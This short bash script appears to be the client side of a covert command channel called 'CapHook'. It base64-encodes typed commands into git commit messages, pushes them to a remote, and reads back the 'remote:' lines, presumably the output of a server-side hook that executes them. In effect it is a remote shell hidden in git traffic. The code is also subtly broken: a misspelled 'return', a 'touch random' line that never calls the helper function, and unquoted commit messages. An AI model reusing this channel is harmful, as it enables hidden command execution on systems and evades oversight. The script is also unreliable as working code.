#!/bin/bash

random(){
    retun cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w ${1:-32} | head -n 1
}

while true; do
    echo "CapHook> "
    read command
    encode=$(echo ${command} | base64)
    echo ${encode}
    touch random
    git add .
    git commit -m ${encode}
    git push | grep "remote: " | awk '{print $2}'
done
